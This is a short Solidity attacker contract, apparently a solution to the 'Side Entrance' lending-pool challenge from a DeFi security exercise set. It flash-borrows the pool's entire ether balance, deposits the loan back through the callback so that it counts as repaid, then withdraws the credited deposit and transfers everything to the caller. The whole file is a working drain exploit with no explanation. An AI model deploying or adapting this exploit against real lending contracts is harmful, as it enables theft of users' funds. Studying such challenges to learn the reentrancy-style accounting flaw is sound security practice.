// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {
    address pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function execute() external payable {
        // deposit
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    function flashLoanAttack() external {
        SideEntranceLenderPool(pool).flashLoan(address(pool).balance);

        SideEntranceLenderPool(pool).withdraw();

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
